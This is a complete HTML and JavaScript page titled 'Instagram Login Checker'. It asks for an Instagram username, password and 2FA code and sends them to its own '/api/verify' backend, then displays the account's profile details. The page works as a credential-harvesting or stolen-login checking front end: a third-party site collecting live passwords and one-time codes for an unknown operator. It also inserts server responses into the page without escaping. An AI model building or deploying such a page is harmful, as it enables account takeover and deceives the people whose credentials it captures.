<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login Checker</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            max-width: 450px;
            width: 100%;
            padding: 40px;
            animation: slideUp 0.5s ease;
        }

        @keyframes slideUp {
            from {
                opacity: 0;
                transform: translateY(30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .logo {
            text-align: center;
            margin-bottom: 30px;
        }

        .logo h1 {
            font-size: 36px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 10px;
        }

        .logo p {
            color: #666;
            font-size: 14px;
        }

        .input-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            color: #333;
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 8px;
        }

        input {
            width: 100%;
            padding: 14px 16px;
            border: 2px solid #e0e0e0;
            border-radius: 10px;
            font-size: 15px;
            transition: all 0.3s ease;
            font-family: inherit;
        }

        input:focus {
            outline: none;
            border-color: #667eea;
            box-shadow: 0 0 0 4px rgba(102, 126, 234, 0.1);
        }

        .btn {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 10px;
            position: relative;
            overflow: hidden;
        }

        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 25px rgba(102, 126, 234, 0.4);
        }

        .btn:active {
            transform: translateY(0);
        }

        .btn:disabled {
            opacity: 0.7;
            cursor: not-allowed;
            transform: none;
        }

        .btn-text {
            position: relative;
            z-index: 1;
        }

        .loader {
            display: inline-block;
            width: 18px;
            height: 18px;
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 0.8s linear infinite;
            vertical-align: middle;
            margin-right: 8px;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .result {
            margin-top: 25px;
            padding: 18px;
            border-radius: 12px;
            font-size: 14px;
            line-height: 1.6;
            display: none;
            animation: slideIn 0.4s ease;
        }

        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateY(-15px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .success {
            background: #d4edda;
            color: #155724;
            border: 2px solid #c3e6cb;
        }

        .error {
            background: #f8d7da;
            color: #721c24;
            border: 2px solid #f5c6cb;
        }

        .warning {
            background: #fff3cd;
            color: #856404;
            border: 2px solid #ffeaa7;
        }

        .user-info {
            margin-top: 15px;
            padding: 18px;
            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
            border-radius: 12px;
            font-size: 13px;
        }

        .user-info-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 10px 0;
            border-bottom: 1px solid rgba(0, 0, 0, 0.1);
        }

        .user-info-row:last-child {
            border-bottom: none;
        }

        .user-info-label {
            font-weight: 600;
            color: #333;
        }

        .user-info-value {
            color: #555;
            text-align: right;
        }

        .badge {
            display: inline-block;
            padding: 4px 10px;
            border-radius: 12px;
            font-size: 12px;
            font-weight: 600;
        }

        .badge-verified {
            background: #4CAF50;
            color: white;
        }

        .badge-not-verified {
            background: #f44336;
            color: white;
        }

        .hidden {
            display: none;
        }

        @media (max-width: 480px) {
            .container {
                padding: 30px 20px;
            }

            .logo h1 {
                font-size: 28px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <h1>üîê Instagram Checker</h1>
            <p>Verify your Instagram login credentials</p>
        </div>

        <form id="loginForm">
            <div class="input-group">
                <label for="username">üì± Username</label>
                <input 
                    type="text" 
                    id="username" 
                    placeholder="your_instagram_username" 
                    autocomplete="username"
                    required>
            </div>

            <div class="input-group">
                <label for="password">üîë Password</label>
                <input 
                    type="password" 
                    id="password" 
                    placeholder="‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢" 
                    autocomplete="current-password"
                    required>
            </div>

            <div class="input-group hidden" id="tfaGroup">
                <label for="tfa">üîê 2FA Verification Code</label>
                <input 
                    type="text" 
                    id="tfa" 
                    placeholder="123456" 
                    maxlength="6"
                    pattern="[0-9]{6}">
            </div>

            <button type="submit" class="btn" id="submitBtn">
                <span class="btn-text" id="btnText">Verify Login</span>
            </button>
        </form>

        <div id="result" class="result"></div>
    </div>

    <script>
        const form = document.getElementById('loginForm');
        const resultDiv = document.getElementById('result');
        const submitBtn = document.getElementById('submitBtn');
        const btnText = document.getElementById('btnText');
        const tfaGroup = document.getElementById('tfaGroup');
        const usernameInput = document.getElementById('username');
        const passwordInput = document.getElementById('password');
        const tfaInput = document.getElementById('tfa');

        // Determine API URL based on environment
        const API_URL = window.location.hostname === 'localhost' 
            ? 'http://localhost:5000/api/verify'
            : '/api/verify';

        form.addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const username = usernameInput.value.trim();
            const password = passwordInput.value;
            const tfa = tfaInput.value.trim();

            if (!username || !password) {
                showResult('error', '‚ùå Please enter both username and password');
                return;
            }

            // Show loading state
            submitBtn.disabled = true;
            btnText.innerHTML = '<span class="loader"></span>Verifying...';
            resultDiv.style.display = 'none';

            try {
                const response = await fetch(API_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        username: username,
                        password: password,
                        verification_code: tfa || null
                    })
                });

                const data = await response.json();

                if (data.success) {
                    let userInfoHTML = '';
                    if (data.user_info) {
                        const info = data.user_info;
                        userInfoHTML = `
                            <div class="user-info">
                                <div class="user-info-row">
                                    <span class="user-info-label">Username</span>
                                    <span class="user-info-value">@${info.username}</span>
                                </div>
                                <div class="user-info-row">
                                    <span class="user-info-label">Full Name</span>
                                    <span class="user-info-value">${info.full_name || 'N/A'}</span>
                                </div>
                                <div class="user-info-row">
                                    <span class="user-info-label">User ID</span>
                                    <span class="user-info-value">${info.user_id}</span>
                                </div>
                                <div class="user-info-row">
                                    <span class="user-info-label">Verified</span>
                                    <span class="user-info-value">
                                        <span class="badge ${info.is_verified ? 'badge-verified' : 'badge-not-verified'}">
                                            ${info.is_verified ? '‚úì Verified' : '‚úó Not Verified'}
                                        </span>
                                    </span>
                                </div>
                                <div class="user-info-row">
                                    <span class="user-info-label">Account Type</span>
                                    <span class="user-info-value">${info.is_private ? 'üîí Private' : 'üîì Public'}</span>
                                </div>
                                <div class="user-info-row">
                                    <span class="user-info-label">Followers</span>
                                    <span class="user-info-value">${formatNumber(info.follower_count)}</span>
                                </div>
                                <div class="user-info-row">
                                    <span class="user-info-label">Following</span>
                                    <span class="user-info-value">${formatNumber(info.following_count)}</span>
                                </div>
                                <div class="user-info-row">
                                    <span class="user-info-label">Posts</span>
                                    <span class="user-info-value">${formatNumber(info.media_count)}</span>
                                </div>
                            </div>
                        `;
                    }
                    showResult('success', `${data.message}${userInfoHTML}`);
                    tfaGroup.classList.add('hidden');
                    form.reset();

                } else if (data.requires_2fa) {
                    tfaGroup.classList.remove('hidden');
                    showResult('warning', data.message);
                    tfaInput.focus();

                } else {
                    showResult('error', data.message || data.error || 'Login failed');
                }

            } catch (error) {
                console.error('Error:', error);
                showResult('error', `‚ùå Network error: ${error.message}. Please check your connection.`);
            } finally {
                submitBtn.disabled = false;
                btnText.textContent = 'Verify Login';
            }
        });

        function showResult(type, message) {
            resultDiv.className = `result ${type}`;
            resultDiv.innerHTML = message;
            resultDiv.style.display = 'block';
        }

        function formatNumber(num) {
            if (num >= 1000000) {
                return (num / 1000000).toFixed(1) + 'M';
            } else if (num >= 1000) {
                return (num / 1000).toFixed(1) + 'K';
            }
            return num.toString();
        }
    </script>
</body>
  </html>
